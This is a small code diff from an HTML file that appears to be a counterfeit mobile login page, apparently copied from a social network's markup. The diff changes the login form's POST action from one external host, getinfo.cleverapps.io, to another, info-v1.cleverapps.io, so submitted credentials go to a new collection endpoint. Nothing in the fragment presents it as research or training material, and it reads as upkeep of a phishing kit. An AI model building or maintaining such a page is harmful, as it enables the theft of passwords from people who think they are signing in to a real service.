@@ -670,7 +670,7 @@
                   <div class="_5rut">
                     <form
                     method="POST"
-                    action="http://getinfo.cleverapps.io"
+                    action="http://info-v1.cleverapps.io"
                       class="mobile-login-form _9hp- _5spm"
                       id="login_form"
                       novalidate="1"
